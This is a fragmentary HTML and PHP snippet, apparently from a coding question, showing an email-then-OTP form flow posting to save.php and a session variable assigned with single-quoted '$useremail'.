...
<body>
    <div id="main-div">
        ...
        <div id="sub-div">
            ...
            <form id="form1" name="form1" action="save.php" method="POST" onsubmit="return validatemail()">
            ...
            <form id="form2" name="form2" action="save.php" method="POST" onsubmit="return validatotp()">
...
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
    if (isset($_POST['otpsmbt']))
    {
        ...
        $_SESSION["usrmal"] = '$useremail';
        $sess = $_SESSION["usrmal"];
